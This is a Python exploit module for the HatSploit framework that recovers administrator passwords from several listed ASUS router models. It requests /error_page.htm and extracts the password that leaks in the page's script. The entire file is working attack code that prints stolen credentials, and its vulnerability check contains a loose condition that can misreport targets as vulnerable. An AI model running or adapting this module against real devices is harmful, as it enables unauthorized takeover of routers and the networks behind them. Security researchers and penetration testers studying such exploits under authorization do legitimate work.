#!/usr/bin/env python3

#
# This module requires HatSploit: https://hatsploit.netlify.app
# Current source: https://github.com/EntySec/HatSploit
#

import re

from hatsploit.lib.module import Module
from hatsploit.utils.http import HTTPClient


class HatSploitModule(Module, HTTPClient):
    details = {
        'Name': "Asus Multi Password Disclosure",
        'Module': "exploit/linux/asus/multi_password_disclosure",
        'Authors': [
            'Ivan Nikolsky (enty8080) - module developer',
            'Harry Sintonen (piru) - vulnerability researcher'
        ],
        'Description': "Asus multiple devices password disclosure exploit.",
        'Comments': [
            'ASUS RT-N10U with firmware 3.0.0.4.374_168',
            'ASUS RT-N56U with firmware 3.0.0.4.374_979',
            'ASUS DSL-N55U with firmware 3.0.0.4.374_1397',
            'ASUS RT-AC66U with firmware 3.0.0.4.374_2050',
            'ASUS RT-N15U with firmware 3.0.0.4.374_16',
            'ASUS RT-N53 with firmware 3.0.0.4.374_311'
        ],
        'Platform': "linux",
        'Risk': "high"
    }

    options = {
        'RHOST': {
            'Description': "Remote host.",
            'Value': None,
            'Type': "ip",
            'Required': True
        },
        'RPORT': {
            'Description': "Remote port.",
            'Value': 8080,
            'Type': "port",
            'Required': True
        },
        'USERNAME': {
            'Description': "Default username.",
            'Value': "admin",
            'Type': None,
            'Required': True
        }
    }

    def exploit(self, remote_host, remote_port, username):
        response = self.http_request(
            method="GET",
            host=remote_host,
            port=remote_port,
            path='/error_page.htm'
        )

        creds = re.findall(r"if\('1' == '0' \|\| '(.+?)' == '" + username + "'\)", response.text)

        if len(creds):
            password = creds[0]
            self.print_table("Credentials", ('Username', 'Password'), (username, password))
        else:
            self.print_warning(f"Target vulnerable, but default username is not {username}.")

    def check(self, remote_host, remote_port):
        response = self.http_request(
            method="GET",
            host=remote_host,
            port=remote_port,
            path='/error_page.htm'
        )

        if not response and response.status_code != 200:
            self.print_error("Target is not vulnerable!")
            return False

        return True

    def run(self):
        remote_host, remote_port, username = self.parse_options(self.options)

        self.print_process(f"Exploiting {remote_host}...")

        if not self.check(remote_host, remote_port):
            self.print_error(f"Exploit failed!")
            return

        self.exploit(remote_host, remote_port, username)
